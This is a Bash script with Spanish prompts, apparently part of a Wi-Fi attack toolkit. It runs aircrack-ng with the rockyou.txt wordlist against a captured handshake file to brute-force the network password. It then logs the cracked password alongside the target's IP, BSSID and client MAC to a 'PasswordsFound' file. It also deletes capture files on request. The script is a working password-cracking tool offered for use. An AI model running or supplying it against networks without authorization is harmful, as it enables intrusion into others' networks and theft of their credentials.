#!/bin/bash

echo -e "\n			[!!]Pulse una tecla para iniciar el BRUTE FORCE!!"

read -n 1 -r -s -p ""

# Contar la cantidad de archivos con extensión .cap
cd DDos_Network
count=$(find . -maxdepth 1 -type f -name '*.cap' | wc -l)

# Verificar si la cantidad es mayor que 1 
if [ $count -gt 1 ]; then
  echo -e "\n			[-]El archivo .cap se repite $count veces, CORRIGIENDO, POR FAVOR ESPERE..."
  echo "			[-]Asegurese de usar el archivo .cap correcto (contenedor del Handshake)!!"
  
  # Obtener la longitud de la variable count
  largo=${#count}
  
  	if [ $largo -gt 1 ]; then
    
    	sudo aircrack-ng crack-${count}.cap -w ../rockyou.txt
    	

		output="../PasswordsFound.txt"
	
		wc ../PasswordsFound.txt | awk '{print$1}' > linetemp.txt

		line=$(<linetemp.txt)
			
		echo -e "\n		[+]LLenemos el Formulario: "

		read -p "				[+]ID--TEMP : " idTemporal	
		read -p "				[+]PASSWORD : " passFound
		read -p "				[+]IP--ADDR : " ipFound
			
	
			
		if [ -z $netSsid ]; then
		
			     
			echo " $((line - 2)) | $ipFound | $bssid | $macStation | $idTemporal |  (NULL)  | $passFound |" >> "$output"
		else

			echo " $((line - 2)) | $ipFound | $bssid | $macStation | $idTemporal | $netSsid | $passFound |" >> "$output"
		fi

		rm -f linetemp.txt

		echo "GUARDADO en "$output""
    	
 	elif [ $largo -lt 2 ]; then
    
    	sudo aircrack-ng crack-0${count}.cap -w ../rockyou.txt
	
    	

		output="../PasswordsFound.txt"

		wc ../PasswordsFound.txt | awk '{print$1}' > linetemp.txt

		line=$(<linetemp.txt)
				
		echo -e "\n		[+]LLenemos el Formulario: "

		read -p "				[+]ID--TEMP : " idTemporal	
		read -p "				[+]PASSWORD : " passFound
		read -p "				[+]IP--ADDR : " ipFound
				
	
			
		if [ -z $netSsid ]; then
			
					
			echo " $((line - 2)) | $ipFound | $bssid | $macStation | $idTemporal |  (NULL)  | $passFound |" >> "$output"
		else

			echo " $((line - 2)) | $ipFound | $bssid | $macStation | $idTemporal | $netSsid | $passFound |" >> "$output"
		fi

		rm -f linetemp.txt
		
		echo "GUARDADO en "$output""
	
  	else
  
    	echo "			[!]Es posible que el bufer este lleno"
		read respuesta
		if [ $respuesta = 'y' ]; then

			rm -f *.netxml 
			rm -f *.csv 
			rm -f *.cap
			
			
			echo "			[+]Cache Borrado con Exito!"
			echo "			[+]Reinicie el Programa"
			echo "BYE.."
			sleep 2
			echo "	BYE..BYE"
		else 
			echo "			[!]Debera Borrar el Cache para que Aircrack-ng funcione correctamente"
			sleep 1
			echo "			[!]Caso Contrario, el script le asignara el archivo '.cap' incorrecto!"
			sleep 1
			echo "SALIENDO..."
			sleep 1
			exit 0
		fi 
	fi
  
else

    echo "			[❌️ ]No existe ningún archivo .cap dentro de la carpeta"
fi    
	


